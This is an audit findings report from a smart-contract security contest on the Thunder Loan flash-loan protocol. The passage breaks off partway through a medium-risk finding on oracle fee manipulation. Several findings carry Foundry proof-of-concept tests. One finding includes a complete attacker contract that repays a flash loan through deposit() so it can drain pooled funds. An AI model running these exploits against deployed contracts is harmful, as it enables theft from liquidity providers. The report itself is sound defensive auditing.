# First Flight #3: Thunder Loan - Findings Report

# Table of contents
- ### [Contest Summary](#contest-summary)
- ### [Results Summary](#results-summary)
- ## High Risk Findings
    - [H-01. Storage Collision during upgrade](#H-01)
    - [H-02. Updating exchange rate on token deposit will inflate asset token's exchange rate faster than expected](#H-02)
    - [H-03. fee are less for non standard ERC20 Token](#H-03)
    - [H-04. All the funds can be stolen if the flash loan is returned using deposit()](#H-04)
- ## Medium Risk Findings
    - [M-01. 'ThunderLoan::setAllowedToken' can permanently lock liquidity providers out from redeeming their tokens ](#M-01)
    - [M-02. Attacker can minimize `ThunderLoan::flashloan` fee via price oracle manipulation](#M-02)
    - [M-03. `ThunderLoan:: deposit` is not compatible with Fee tokens and could be exploited by draining other users funds, Making Other user Looses there deposit and yield](#M-03)
- ## Low Risk Findings
    - [L-01. getCalculatedFee can be 0](#L-01)
    - [L-02. updateFlashLoanFee() missing event](#L-02)
    - [L-03. Mathematic Operations Handled Without Precision in getCalculatedFee() Function in ThunderLoan.sol](#L-03)


# <a id='contest-summary'></a>Contest Summary

### Sponsor: First Flight #3

### Dates: Nov 1st, 2023 - Nov 8th, 2023

[See more contest details here](https://www.codehawks.com/contests/clocopz26004rkx08q1n61wnz)

# <a id='results-summary'></a>Results Summary

### Number of findings:
   - High: 4
   - Medium: 3
   - Low: 3


# High Risk Findings

## <a id='H-01'></a>H-01. Storage Collision during upgrade

_Submitted by [0x6a70](/profile/clnupn4c20002mk08inaqc8is), [happyformerlawyer](/profile/clmca6fy60000mp08og4j1koc), [zxarcs](/profile/clk6xhhll0004jy08igg6220s), [shikhar229169](/profile/clk3yh639002emf08ywok1hzf), [alphabuddha1357](/profile/clnxv56t30004l6085wcq3syn), [InAllHonesty](/profile/clkgm90b9000gms085g528phk), [bbcrypt](/profile/cllf3myg90006mb08a2qv3801), [jerseyjoewalcott](/profile/clnueldbf000lky08h4g3kjx4), [TAdev](/profile/clog7yt830000i308nsptid7z), [abhishekthakur](/profile/clkaqh5590000k108p39ktfwl), [nisedo](/profile/clk3saar60000l608gsamuvnw), [aethrouzz](/profile/clmx62ogr0000l90843cr8gtz), [Leogold](/profile/cll3x4wjp0000jv08bizzorhg), [Osora9](/profile/clnvjxx5m0002mr08m4o4dl44), [Ciara](/profile/clnvs09md0006jx08tmvz0w19), [CodeLock](/profile/clo3l5kyo0000mk08r3no7q4n), [wafflemakr](/profile/clmm1t0210000mi08hak3ir5r), [asimaranov](/profile/clo4plnc4001mmi08szfoggg0), [dcheng](/profile/clnw5u1te0006l708th66izul), [Nocturnus](/profile/clk6gsllo0000mn08rjvbjy0x), [lian886](/profile/clk6rtfkx0008mn083rima8eb), [Louis](/profile/clloixi3x0000la08i46r5hc8), [0xhashiman](/profile/clofddxp4001ijz08hm9txokv). Selected submission by: [Leogold](/profile/cll3x4wjp0000jv08bizzorhg)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-11-Thunder-Loan/blob/8539c83865eb0d6149e4d70f37a35d9e72ac7404/src/upgradedProtocol/ThunderLoanUpgraded.sol#L95C5-L101C1

https://github.com/Cyfrin/2023-11-Thunder-Loan/blob/8539c83865eb0d6149e4d70f37a35d9e72ac7404/src/protocol/ThunderLoan.sol#L96C1-L100C1

## Summary
The thunderloanupgrade.sol storage layout is not compatible with the storage layout of thunderloan.sol which will cause storage collision and mismatch of variable to different data.
## Vulnerability Details
Thunderloan.sol at slot 1,2 and 3 holds s_feePrecision, s_flashLoanFee and s_currentlyFlashLoaning, respectively, but the ThunderLoanUpgraded at slot 1 and 2 holds s_flashLoanFee, s_currentlyFlashLoaning respectively. the s_feePrecision from the thunderloan.sol was changed to a constant variable which will no longer be assessed from the state variable. This will cause the location at which the upgraded version will be pointing to for some significant state variables like s_flashLoanFee  to be wrong because s_flashLoanFee is now pointing to the slot of the s_feePrecision in the thunderloan.sol and when this fee is used to compute the fee for flashloan it will return a fee amount greater than the intention of the developer.
 s_currentlyFlashLoaning might not really be affected as it is back to default when a flashloan is completed but still to be noted that the value at that slot can be cleared to be on a safer side. 
## Impact
1) Fee is miscalculated for flashloan
1)  users pay same amount of what they borrowed as fee
## Tools Used
foundry
##POC 
```
import {ThunderLoanUpgraded} from "../../src/upgradedProtocol/ThunderLoanUpgraded.sol";

 function upgradeThunderloan() internal {
        thunderLoanUpgraded = new ThunderLoanUpgraded();
        thunderLoan.upgradeTo(address(thunderLoanUpgraded));
        thunderLoanUpgraded = ThunderLoanUpgraded(address(proxy));
    }

 function testSlotValuesBeforeAndAfterUpgrade() public setAllowedToken {
        AssetToken asset = thunderLoan.getAssetFromToken(tokenA);
        uint precision = thunderLoan.getFeePrecision();
        uint fee = thunderLoan.getFee();
        bool isflanshloaning = thunderLoan.isCurrentlyFlashLoaning(tokenA);
        /// 4 slots before upgrade
        console.log("????SLOTS VALUE BEFORE UPGRADE????");
        console.log("slot 0 for s_tokenToAssetToken =>", address(asset));
        console.log("slot 1 for s_feePrecision =>", precision);
        console.log("slot 2 for s_flashLoanFee =>", fee);
        console.log("slot 3 for s_currentlyFlashLoaning =>", isflanshloaning);
        //upgrade function
        upgradeThunderloan();

        //// after upgrade they are only 3 valid slot left because precision is now set to constant
        AssetToken assetUpgrade = thunderLoan.getAssetFromToken(tokenA);
        uint feeUpgrade = thunderLoan.getFee();
        bool isflanshloaningUpgrade = thunderLoan.isCurrentlyFlashLoaning(
            tokenA
        );

        console.log("????SLOTS VALUE After UPGRADE????");
        console.log("slot 0 for s_tokenToAssetToken =>", address(assetUpgrade));
        console.log("slot 1 for s_flashLoanFee =>", feeUpgrade);
        console.log(
            "slot 2 for s_currentlyFlashLoaning =>",
            isflanshloaningUpgrade
        );
        assertEq(address(asset), address(assetUpgrade));
        //asserting precision value before upgrade to be what fee takes after upgrades
        assertEq(precision, feeUpgrade); // #POC
        assertEq(isflanshloaning, isflanshloaningUpgrade);
    }

```
Add the code  above to thunderloantest.t.sol and run with `forge test --mt testSlotValuesBeforeAndAfterUpgrade -vv`
## POC 2
```  
function testFlashLoanAfterUpgrade() public setAllowedToken hasDeposits {
        //upgrade thunderloan
        upgradeThunderloan();

        uint256 amountToBorrow = AMOUNT * 10;
        console.log("amount flashloaned", amountToBorrow);
        uint256 calculatedFee = thunderLoan.getCalculatedFee(
            tokenA,
            amountToBorrow
        );
        AssetToken assetToken = thunderLoan.getAssetFromToken(tokenA);

        vm.startPrank(user);
        tokenA.mint(address(mockFlashLoanReceiver), amountToBorrow);
        thunderLoan.flashloan(
            address(mockFlashLoanReceiver),
            tokenA,
            amountToBorrow,
            ""
        );
        vm.stopPrank();

        console.log("feepaid", calculatedFee);
        assertEq(amountToBorrow, calculatedFee);
    }

```
Add the code above to thunderloantest.t.sol and run `forge test --mt testFlashLoanAfterUpgrade -vv` to test for the second poc 
## Recommendations
The team should should make sure the the fee is pointing to the correct location as intended by the developer: a suggestion recommendation is for the team to get the feeValue from the previous implementation, clear the values that will not be needed again and after upgrade reset the fee back to its previous value from the implementation.
##POC for recommendation
```
//
 function upgradeThunderloanFixed() internal {
        thunderLoanUpgraded = new ThunderLoanUpgraded();
        //getting the current fee;
        uint fee = thunderLoan.getFee();
        // clear the fee as
        thunderLoan.updateFlashLoanFee(0);
        // upgrade to the new implementation
        thunderLoan.upgradeTo(address(thunderLoanUpgraded));
        //wrapped the abi
        thunderLoanUpgraded = ThunderLoanUpgraded(address(proxy));
        // set the fee back to the correct value
        thunderLoanUpgraded.updateFlashLoanFee(fee);
    }



function testSlotValuesFixedfterUpgrade() public setAllowedToken {
        AssetToken asset = thunderLoan.getAssetFromToken(tokenA);
        uint precision = thunderLoan.getFeePrecision();
        uint fee = thunderLoan.getFee();
        bool isflanshloaning = thunderLoan.isCurrentlyFlashLoaning(tokenA);
        /// 4 slots before upgrade
        console.log("????SLOTS VALUE BEFORE UPGRADE????");
        console.log("slot 0 for s_tokenToAssetToken =>", address(asset));
        console.log("slot 1 for s_feePrecision =>", precision);
        console.log("slot 2 for s_flashLoanFee =>", fee);
        console.log("slot 3 for s_currentlyFlashLoaning =>", isflanshloaning);
        //upgrade function
        upgradeThunderloanFixed();

        //// after upgrade they are only 3 valid slot left because precision is now set to constant
        AssetToken assetUpgrade = thunderLoan.getAssetFromToken(tokenA);
        uint feeUpgrade = thunderLoan.getFee();
        bool isflanshloaningUpgrade = thunderLoan.isCurrentlyFlashLoaning(
            tokenA
        );

        console.log("????SLOTS VALUE After UPGRADE????");
        console.log("slot 0 for s_tokenToAssetToken =>", address(assetUpgrade));
        console.log("slot 1 for s_flashLoanFee =>", feeUpgrade);
        console.log(
            "slot 2 for s_currentlyFlashLoaning =>",
            isflanshloaningUpgrade
        );
        assertEq(address(asset), address(assetUpgrade));
        //asserting precision value before upgrade to be what fee takes after upgrades
        assertEq(fee, feeUpgrade); // #POC
        assertEq(isflanshloaning, isflanshloaningUpgrade);
    }

```
Add the code above to thunderloantest.t.sol and run with `forge test --mt testSlotValuesFixedfterUpgrade -vv`.
it can also be tested with `testFlashLoanAfterUpgrade function` and see the fee properly calculated for flashloan

## <a id='H-02'></a>H-02. Updating exchange rate on token deposit will inflate asset token's exchange rate faster than expected

_Submitted by [0x6a70](/profile/clnupn4c20002mk08inaqc8is), [zxarcs](/profile/clk6xhhll0004jy08igg6220s), [shikhar229169](/profile/clk3yh639002emf08ywok1hzf), [kumar](/profile/cloeizs9m000ujs088lb7pvj2), [happyformerlawyer](/profile/clmca6fy60000mp08og4j1koc), [araj](/profile/clma4kzm40000lb08cngnui6u), [Leogold](/profile/cll3x4wjp0000jv08bizzorhg), [0xTheBlackPanther](/profile/clnca1ftl0000lf08bfytq099), [KiteWeb3](/profile/clk9pzw3j000smh08313lj91l), [InAllHonesty](/profile/clkgm90b9000gms085g528phk), [bbcrypt](/profile/cllf3myg90006mb08a2qv3801), [TAdev](/profile/clog7yt830000i308nsptid7z), [benbo](/profile/clo4tx3kj0000l808q2ug31l8), [Eric](/profile/clkbqsa510000mi082he56qby), [nisedo](/profile/clk3saar60000l608gsamuvnw), [darksnow](/profile/clk80pzvl000yl608bqwqky5y), [zach030](/profile/clllg9trq0002ml0881bhkegb), [zhuying](/profile/clk5hy2a0000ajy087yh41k20), [aethrouzz](/profile/clmx62ogr0000l90843cr8gtz), [anonditor](/profile/clon1iwns0000jv07ebgls1aj), [0xJimbo](/profile/clkcjsdhb0000l108bm19v6sw), [GoSoul22](/profile/clk7zkyd70002l608iam3ggtg), [Ciara](/profile/clnvs09md0006jx08tmvz0w19), [johnmatrix](/profile/cloiowl4p000rjr088iyg6iod), [0xVinylDavyl](/profile/clkeaiat40000l309ruc9obdh), [anarcheuz](/profile/clmrussuq0008l008ao5w04v1), [Coffee](/profile/clln3vyj7000cml0877uhlb7j), [lian886](/profile/clk6rtfkx0008mn083rima8eb), [abhishekthakur](/profile/clkaqh5590000k108p39ktfwl), [0xSwahili](/profile/clkkxnjij0000m808ykz18zsc), [0xspryon](/profile/clo19fw280000mf08c4yazene), [Nocturnus](/profile/clk6gsllo0000mn08rjvbjy0x), [DenTonylifer](/profile/clocyn92t0003mf088apzq7fo). Selected submission by: [zxarcs](/profile/clk6xhhll0004jy08igg6220s)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-11-Thunder-Loan/blob/8539c83865eb0d6149e4d70f37a35d9e72ac7404/src/protocol/ThunderLoan.sol#L153-L154

# Summary
Exchange rate for asset token is updated on deposit. This means users can deposit (which will increase exchange rate), and then immediately withdraw more underlying tokens than they deposited. 

# Details
Per documentation:
> Liquidity providers can deposit assets into ThunderLoan and be given AssetTokens in return. **These AssetTokens gain interest over time depending on how often people take out flash loans!**

Asset tokens gain interest when people take out flash loans with the underlying tokens. In current version of ThunderLoan, exchange rate is also updated when user deposits underlying tokens.

This does not match with documentation and will end up causing exchange rate to increase on deposit.

This will allow anyone who deposits to immediately withdraw and get more tokens back than they deposited. Underlying of any asset token can be completely drained in this manner.

# Filename
`src/protocol/ThunderLoan.sol`

# Permalinks
https://github.com/Cyfrin/2023-11-Thunder-Loan/blob/8539c83865eb0d6149e4d70f37a35d9e72ac7404/src/protocol/ThunderLoan.sol#L153-L154

# Impact
Users can deposit and immediately withdraw more funds. Since exchange rate is increased on deposit, they will withdraw more funds then they deposited without any flash loans being taken at all.

# Recommendations
It is recommended to not update exchange rate on deposits and updated it only when flash loans are taken, as per documentation.
```diff
function deposit(IERC20 token, uint256 amount) external revertIfZero(amount) revertIfNotAllowedToken(token) {
	AssetToken assetToken = s_tokenToAssetToken[token];
	uint256 exchangeRate = assetToken.getExchangeRate();
	uint256 mintAmount = (amount * assetToken.EXCHANGE_RATE_PRECISION()) / exchangeRate;
	emit Deposit(msg.sender, token, amount);
	assetToken.mint(msg.sender, mintAmount);
-	uint256 calculatedFee = getCalculatedFee(token, amount);
-	assetToken.updateExchangeRate(calculatedFee);
	token.safeTransferFrom(msg.sender, address(assetToken), amount);
}
```

# Tools Used
* Manual Audit
* Foundry

# POC
```solidity
function testExchangeRateUpdatedOnDeposit() public setAllowedToken {
	tokenA.mint(liquidityProvider, AMOUNT);
	tokenA.mint(user, AMOUNT);

	// deposit some tokenA into ThunderLoan
	vm.startPrank(liquidityProvider);
	tokenA.approve(address(thunderLoan), AMOUNT);
	thunderLoan.deposit(tokenA, AMOUNT);
	vm.stopPrank();

	// another user also makes a deposit
	vm.startPrank(user);
	tokenA.approve(address(thunderLoan), AMOUNT);
	thunderLoan.deposit(tokenA, AMOUNT);
	vm.stopPrank();        

	AssetToken assetToken = thunderLoan.getAssetFromToken(tokenA);

	// after a deposit, asset token's exchange rate has aleady increased
	// this is only supposed to happen when users take flash loans with underlying
	assertGt(assetToken.getExchangeRate(), 1 * assetToken.EXCHANGE_RATE_PRECISION());

	// now liquidityProvider withdraws and gets more back because exchange
	// rate is increased but no flash loans were taken out yet
	// repeatedly doing this could drain all underlying for any asset token
	vm.startPrank(liquidityProvider);
	thunderLoan.redeem(tokenA, assetToken.balanceOf(liquidityProvider));
	vm.stopPrank();

	assertGt(tokenA.balanceOf(liquidityProvider), AMOUNT);
}
```

## <a id='H-03'></a>H-03. fee are less for non standard ERC20 Token

_Submitted by [shikhar229169](/profile/clk3yh639002emf08ywok1hzf), [happyformerlawyer](/profile/clmca6fy60000mp08og4j1koc), [bbcrypt](/profile/cllf3myg90006mb08a2qv3801), [TAdev](/profile/clog7yt830000i308nsptid7z), [0xVinylDavyl](/profile/clkeaiat40000l309ruc9obdh), [Dutch](/profile/clnvncrk9000il408ns2kcgj6), [KiteWeb3](/profile/clk9pzw3j000smh08313lj91l). Selected submission by: [KiteWeb3](/profile/clk9pzw3j000smh08313lj91l)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-11-Thunder-Loan/blob/8539c83865eb0d6149e4d70f37a35d9e72ac7404/src/protocol/ThunderLoan.sol#L248-L250

https://github.com/Cyfrin/2023-11-Thunder-Loan/blob/8539c83865eb0d6149e4d70f37a35d9e72ac7404/src/upgradedProtocol/ThunderLoanUpgraded.sol#L246-L248

## Summary
Within the functions ```ThunderLoan::getCalculatedFee()``` and ```ThunderLoanUpgraded::getCalculatedFee()```, an issue arises with the calculated fee value when dealing with non-standard ERC20 tokens. Specifically, the calculated value for non-standard tokens appears significantly lower compared to that of standard ERC20 tokens.
## Vulnerability Details

//ThunderLoan.sol

```solidity
 function getCalculatedFee(IERC20 token, uint256 amount) public view returns (uint256 fee) {
        //slither-disable-next-line divide-before-multiply
@>        uint256 valueOfBorrowedToken = (amount * getPriceInWeth(address(token))) / s_feePrecision;
@>        //slither-disable-next-line divide-before-multiply
        fee = (valueOfBorrowedToken * s_flashLoanFee) / s_feePrecision;
    }
```

```solidity
//ThunderLoanUpgraded.sol

 function getCalculatedFee(IERC20 token, uint256 amount) public view returns (uint256 fee) {
        //slither-disable-next-line divide-before-multiply
@>        uint256 valueOfBorrowedToken = (amount * getPriceInWeth(address(token))) / FEE_PRECISION;
        //slither-disable-next-line divide-before-multiply
@>        fee = (valueOfBorrowedToken * s_flashLoanFee) / FEE_PRECISION;
    }
```

## Impact
Let's say:
- user_1 asks a flashloan for 1 ETH.
- user_2 asks a flashloan for 2000 USDT.

```solidity
function getCalculatedFee(IERC20 token, uint256 amount) public view returns (uint256 fee) {
        
        //1 ETH = 1e18 WEI
        //2000 USDT = 2 * 1e9 WEI

        uint256 valueOfBorrowedToken = (amount * getPriceInWeth(address(token))) / s_feePrecision;

        // valueOfBorrowedToken ETH = 1e18 * 1e18 / 1e18 WEI
        // valueOfBorrowedToken USDT= 2 * 1e9 * 1e18 / 1e18 WEI

        fee = (valueOfBorrowedToken * s_flashLoanFee) / s_feePrecision;

        //fee ETH = 1e18 * 3e15 / 1e18 = 3e15 WEI = 0,003 ETH
        //fee USDT: 2 * 1e9 * 3e15 / 1e18 = 6e6 WEI = 0,000000000006 ETH
    }
```
The fee for the user_2 are much lower then user_1 despite they asks a flashloan for the same value (hypotesis 1 ETH = 2000 USDT). 

## Tools Used
Manual review

## Recommendations
Adjust the precision accordinly with the allowed tokens considering that the non standard ERC20 haven't 18 decimals.
## <a id='H-04'></a>H-04. All the funds can be stolen if the flash loan is returned using deposit()

_Submitted by [IvanFitro](/profile/clkbfsgal0004me08ro82cg7e), [alsirang](/profile/clnvs6t2c000cjx08zxo9vgf4), [shikhar229169](/profile/clk3yh639002emf08ywok1hzf), [kumar](/profile/cloeizs9m000ujs088lb7pvj2), [Leogold](/profile/cll3x4wjp0000jv08bizzorhg), [InAllHonesty](/profile/clkgm90b9000gms085g528phk), [bbcrypt](/profile/cllf3myg90006mb08a2qv3801), [TAdev](/profile/clog7yt830000i308nsptid7z), [r0ck3tz](/profile/clon4zj7y000cjs08junwc16z), [0xloscar01](/profile/cllgowxgy0002la08qi9bhab4), [wafflemakr](/profile/clmm1t0210000mi08hak3ir5r), [anonditor](/profile/clon1iwns0000jv07ebgls1aj), [Aitor](/profile/clk44j5cn000wl908r2o0n9w5), [0xJimbo](/profile/clkcjsdhb0000l108bm19v6sw), [Pelz](/profile/clokuwofs000yih08n1oqrf6d), [GoSoul22](/profile/clk7zkyd70002l608iam3ggtg), [matthu](/profile/clnukaeq80004lc08xdy9jw90), [johnmatrix](/profile/cloiowl4p000rjr088iyg6iod), [uint256vieet](/profile/clkxj0sw20028l0085e7qx21j), [CodeLock](/profile/clo3l5kyo0000mk08r3no7q4n), [zzz](/profile/clk6zdyd4000gkz0892q2rvyn), [0xspryon](/profile/clo19fw280000mf08c4yazene), [0xhashiman](/profile/clofddxp4001ijz08hm9txokv). Selected submission by: [IvanFitro](/profile/clkbfsgal0004me08ro82cg7e)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-11-Thunder-Loan/blob/8539c83865eb0d6149e4d70f37a35d9e72ac7404/src/protocol/ThunderLoan.sol#L147-L156

https://github.com/Cyfrin/2023-11-Thunder-Loan/blob/8539c83865eb0d6149e4d70f37a35d9e72ac7404/src/protocol/ThunderLoan.sol#L180-L217

## Summary
An attacker can acquire a flash loan and deposit funds directly into the contract using the **`deposit()`**, enabling stealing all the funds.

## Vulnerability Details
The **`flashloan()`** performs a crucial balance check to ensure that the ending balance, after the flash loan, exceeds the initial balance, accounting for any borrower fees. This verification is achieved by comparing **`endingBalance`** with **`startingBalance + fee`**. However, a vulnerability emerges when calculating endingBalance using **`token.balanceOf(address(assetToken))`**.

Exploiting this vulnerability, an attacker can return the flash loan using the **`deposit()`** instead of **`repay()`**. This action allows the attacker to mint **`AssetToken`** and subsequently redeem it using **`redeem()`**. What makes this possible is the apparent increase in the Asset contract's balance, even though it resulted from the use of the incorrect function. Consequently, the flash loan doesn't trigger a revert.
## POC
To execute the test successfully, please complete the following steps:
1. Place the **`attack.sol`** file within the mocks folder.
1. Import the contract in **`ThunderLoanTest.t.sol`**.
1. Add **`testattack()`** function in **`ThunderLoanTest.t.sol`**.
1. Change the **`setUp()`** function in **`ThunderLoanTest.t.sol`**.
```Solidity
import { Attack } from "../mocks/attack.sol";
```
```Solidity
function testattack() public setAllowedToken hasDeposits {
        uint256 amountToBorrow = AMOUNT * 10;
        vm.startPrank(user);
        tokenA.mint(address(attack), AMOUNT);
        thunderLoan.flashloan(address(attack), tokenA, amountToBorrow, "");
        attack.sendAssetToken(address(thunderLoan.getAssetFromToken(tokenA)));
        thunderLoan.redeem(tokenA, type(uint256).max);
        vm.stopPrank();

        assertLt(tokenA.balanceOf(address(thunderLoan.getAssetFromToken(tokenA))), DEPOSIT_AMOUNT);   
    }
```
```Solidity
function setUp() public override {
        super.setUp();
        vm.prank(user);
        mockFlashLoanReceiver = new MockFlashLoanReceiver(address(thunderLoan));
        vm.prank(user);
        attack = new Attack(address(thunderLoan));   
    }
```
attack.sol
```Solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { SafeERC20 } from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import { IFlashLoanReceiver } from "../../src/interfaces/IFlashLoanReceiver.sol";

interface IThunderLoan {
    function repay(address token, uint256 amount) external;
    function deposit(IERC20 token, uint256 amount) external;
    function getAssetFromToken(IERC20 token) external;
}


contract Attack {
    error MockFlashLoanReceiver__onlyOwner();
    error MockFlashLoanReceiver__onlyThunderLoan();

    using SafeERC20 for IERC20;

    address s_owner;
    address s_thunderLoan;

    uint256 s_balanceDuringFlashLoan;
    uint256 s_balanceAfterFlashLoan;

    constructor(address thunderLoan) {
        s_owner = msg.sender;
        s_thunderLoan = thunderLoan;
        s_balanceDuringFlashLoan = 0;
    }

    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address initiator,
        bytes calldata /*  params */
    )
        external
        returns (bool)
    {
        s_balanceDuringFlashLoan = IERC20(token).balanceOf(address(this));
        
        if (initiator != s_owner) {
            revert MockFlashLoanReceiver__onlyOwner();
        }
        
        if (msg.sender != s_thunderLoan) {
            revert MockFlashLoanReceiver__onlyThunderLoan();
        }
        IERC20(token).approve(s_thunderLoan, amount + fee);
        IThunderLoan(s_thunderLoan).deposit(IERC20(token), amount + fee);
        s_balanceAfterFlashLoan = IERC20(token).balanceOf(address(this));
        return true;
    }

    function getbalanceDuring() external view returns (uint256) {
        return s_balanceDuringFlashLoan;
    }

    function getBalanceAfter() external view returns (uint256) {
        return s_balanceAfterFlashLoan;
    }

    function sendAssetToken(address assetToken) public {
        
        IERC20(assetToken).transfer(msg.sender, IERC20(assetToken).balanceOf(address(this)));
    }
}
```
Notice that the **`assetLt()`** checks whether the balance of the AssetToken contract is less than the **`DEPOSIT_AMOUNT`**, which represents the initial balance. The contract balance should never decrease after a flash loan, it should always be higher.
## Impact
All the funds of the AssetContract can be stolen.
## Tools Used
Manual review.
## Recommendations
Add a check in **`deposit()`** to make it impossible to use it in the same block of the flash loan.
For example registring the block.number in a variable in **`flashloan()`** and checking it in **`deposit()`**.

# Medium Risk Findings

## <a id='M-01'></a>M-01. 'ThunderLoan::setAllowedToken' can permanently lock liquidity providers out from redeeming their tokens 

_Submitted by [happyformerlawyer](/profile/clmca6fy60000mp08og4j1koc), [kumar](/profile/cloeizs9m000ujs088lb7pvj2), [shikhar229169](/profile/clk3yh639002emf08ywok1hzf), [araj](/profile/clma4kzm40000lb08cngnui6u), [Leogold](/profile/cll3x4wjp0000jv08bizzorhg), [Eric](/profile/clkbqsa510000mi082he56qby), [pacelliv](/profile/clk45g5zs003smg08s6utu2a0), [0xSwahili](/profile/clkkxnjij0000m808ykz18zsc), [nisedo](/profile/clk3saar60000l608gsamuvnw), [r0ck3tz](/profile/clon4zj7y000cjs08junwc16z), [Ciara](/profile/clnvs09md0006jx08tmvz0w19), [CodeLock](/profile/clo3l5kyo0000mk08r3no7q4n), [anarcheuz](/profile/clmrussuq0008l008ao5w04v1), [wafflemakr](/profile/clmm1t0210000mi08hak3ir5r), [Coffee](/profile/clln3vyj7000cml0877uhlb7j), [0xmusashi](/profile/cllfe326u0004mm08qjo85t59), [0xspryon](/profile/clo19fw280000mf08c4yazene), [aethrouzz](/profile/clmx62ogr0000l90843cr8gtz). Selected submission by: [Coffee](/profile/clln3vyj7000cml0877uhlb7j)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-11-Thunder-Loan/blob/8539c83865eb0d6149e4d70f37a35d9e72ac7404/src/protocol/ThunderLoan.sol#L227-L244

## Summary

If the 'ThunderLoan::setAllowedToken' function is called with the intention of setting an allowed token to false and thus deleting the assetToken to token mapping; nobody would be able to redeem funds of that token in the 'ThunderLoan::redeem' function and thus have them locked away without access.

## Vulnerability Details

If the owner sets an allowed token to false, this deletes the mapping of the asset token to that ERC20. If this is done, and a liquidity provider has already deposited ERC20 tokens of that type, then the liquidity provider will not be able to redeem them in the 'ThunderLoan::redeem' function. 

```solidity
     function setAllowedToken(IERC20 token, bool allowed) external onlyOwner returns (AssetToken) {
        if (allowed) {
            if (address(s_tokenToAssetToken[token]) != address(0)) {
                revert ThunderLoan__AlreadyAllowed();
            }
            string memory name = string.concat("ThunderLoan ", IERC20Metadata(address(token)).name());
            string memory symbol = string.concat("tl", IERC20Metadata(address(token)).symbol());
            AssetToken assetToken = new AssetToken(address(this), token, name, symbol);
            s_tokenToAssetToken[token] = assetToken;
            emit AllowedTokenSet(token, assetToken, allowed);
            return assetToken;
        } else {
            AssetToken assetToken = s_tokenToAssetToken[token];
@>          delete s_tokenToAssetToken[token];
            emit AllowedTokenSet(token, assetToken, allowed);
            return assetToken;
        }
    }
```

```solidity
     function redeem(
        IERC20 token,
        uint256 amountOfAssetToken
    )
        external
        revertIfZero(amountOfAssetToken)
@>      revertIfNotAllowedToken(token)
    {
        AssetToken assetToken = s_tokenToAssetToken[token];
        uint256 exchangeRate = assetToken.getExchangeRate();
        if (amountOfAssetToken == type(uint256).max) {
            amountOfAssetToken = assetToken.balanceOf(msg.sender);
        }
        uint256 amountUnderlying = (amountOfAssetToken * exchangeRate) / assetToken.EXCHANGE_RATE_PRECISION();
        emit Redeemed(msg.sender, token, amountOfAssetToken, amountUnderlying);
        assetToken.burn(msg.sender, amountOfAssetToken);
        assetToken.transferUnderlyingTo(msg.sender, amountUnderlying);
    }
```

## Impact

The below test passes with a ThunderLoan__NotAllowedToken error. Proving that a liquidity provider cannot redeem their deposited tokens if the setAllowedToken is set to false, Locking them out of their tokens.

```solidity
     function testCannotRedeemNonAllowedTokenAfterDepositingToken() public {
        vm.prank(thunderLoan.owner());
        AssetToken assetToken = thunderLoan.setAllowedToken(tokenA, true);

        tokenA.mint(liquidityProvider, AMOUNT);
        vm.startPrank(liquidityProvider);
        tokenA.approve(address(thunderLoan), AMOUNT);
        thunderLoan.deposit(tokenA, AMOUNT);
        vm.stopPrank();

        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, false);

        vm.expectRevert(abi.encodeWithSelector(ThunderLoan.ThunderLoan__NotAllowedToken.selector, address(tokenA)));
        vm.startPrank(liquidityProvider);
        thunderLoan.redeem(tokenA, AMOUNT_LESS);
        vm.stopPrank();
    }
```

## Tools Used

--Foundry

## Recommendations

It would be suggested to add a check if that assetToken holds any balance of the ERC20, if so, then you cannot remove the mapping.

```diff
     function setAllowedToken(IERC20 token, bool allowed) external onlyOwner returns (AssetToken) {
        if (allowed) {
            if (address(s_tokenToAssetToken[token]) != address(0)) {
                revert ThunderLoan__AlreadyAllowed();
            }
            string memory name = string.concat("ThunderLoan ", IERC20Metadata(address(token)).name());
            string memory symbol = string.concat("tl", IERC20Metadata(address(token)).symbol());
            AssetToken assetToken = new AssetToken(address(this), token, name, symbol);
            s_tokenToAssetToken[token] = assetToken;
            emit AllowedTokenSet(token, assetToken, allowed);
            return assetToken;
        } else {
            AssetToken assetToken = s_tokenToAssetToken[token];
+           uint256 hasTokenBalance = IERC20(token).balanceOf(address(assetToken));
+           if (hasTokenBalance == 0) {
                delete s_tokenToAssetToken[token];
                emit AllowedTokenSet(token, assetToken, allowed);
+           }
            return assetToken;
        }
    }
```
## <a id='M-02'></a>M-02. Attacker can minimize `ThunderLoan::flashloan` fee via price oracle manipulation

_Submitted by [ironcladmerc](/profile/clnue0hoa0006ky08p2fc7lv5), [uba7](/profile/cllina1ss0000jt08ols0vdm7), [0xTheBlackPanther](/profile/clnca1ftl0000lf08bfytq099), [alphabuddha1357](/profile/clnxv56t30004l6085wcq3syn), [zhuying](/profile/clk5hy2a0000ajy087yh41k20), [nisedo](/profile/clk3saar60000l608gsamuvnw), [zxarcs](/profile/clk6xhhll0004jy08igg6220s), [Ciara](/profile/clnvs09md0006jx08tmvz0w19), [anarcheuz](/profile/clmrussuq0008l008ao5w04v1), [aethrouzz](/profile/clmx62ogr0000l90843cr8gtz), [ZedBlockchain](/profile/clk6kgukh0008ld088n5wns9l). Selected submission by: [Ciara](/profile/clnvs09md0006jx08tmvz0w19)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-11-Thunder-Loan/blob/8539c83865eb0d6149e4d70f37a35d9e72ac7404/src/protocol/ThunderLoan.sol#L201-L210

https://github.com/Cyfrin/2023-11-Thunder-Loan/blob/8539c83865eb0d6149e4d70f37a35d9e72ac7404/src/protocol/ThunderLoan.sol#L192

## Vulnerability details

In `ThunderLoan::flashloan` the price of the `fee` is calculated on [line 192](https://github.com/Cyfrin/2023-11-Thunder-Loan/blob/8539c83865eb0d6149e4d70f37a35d9e72ac7404/src/protocol/ThunderLoan.sol#L192) using the method `ThunderLoan::getCalculatedFee`:

```solidity
uint256 fee = getCalculatedFee(token, amount);
```

```solidity
function getCalculatedFee(IERC20 token, uint256 amount) public view returns (uint256 fee) {
    //slither-disable-next-line divide-before-multiply
